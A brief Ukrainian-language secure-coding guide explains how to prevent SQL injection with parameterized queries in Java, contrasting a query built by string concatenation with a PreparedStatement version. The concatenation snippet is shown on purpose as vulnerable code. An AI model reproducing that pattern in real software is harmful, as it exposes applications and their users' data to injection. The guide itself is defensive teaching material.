## How to prevent SQL injection

Більшість випадків SQL-інʼєкцій можна запобігти, використовуючи **параметризовані запити** замість **конкатенації рядків** у SQL-запиті. Такі параметризовані запити також відомі як **підготовлені вирази (prepared statements)**.

Наступний код **вразливий до SQL-інʼєкції**, тому що введення користувача напряму додається до SQL-запиту:
```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
Цей код можна переписати так, щоб введення користувача **не впливало на структуру запиту**:
```
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
Параметризовані запити можна використовувати **в усіх випадках**, де недовірені дані зʼявляються як **значення** в запиті, зокрема:

- у `WHERE`-умові
    
- у значеннях `INSERT` або `UPDATE`
    
Але їх **не можна використовувати** для обробки недовіреного введення в інших частинах SQL-запиту, наприклад:

- імена таблиць
    
- імена стовпців
    
- `ORDER BY`
    
Функціональність додатка, яка вставляє недовірені дані в ці частини запиту, має використовувати інші підходи, наприклад:

- **білий список (whitelist)** дозволених значень
    
- **іншу логіку**, яка забезпечує потрібну поведінку без прямої підстановки даних у SQL
    
Щоб параметризований запит **дійсно захищав від SQL-інʼєкції**, рядок SQL-запиту **завжди має бути жорстко заданою константою**. Він **ніколи не повинен містити змінні дані з будь-якого джерела**.

Не варто вирішувати «вручну», які дані є надійними, і продовжувати використовувати конкатенацію рядків для нібито безпечних випадків. Дуже легко помилитися щодо походження даних або допустити ситуацію, коли зміни в іншому коді зроблять раніше «довірені» дані небезпечними.
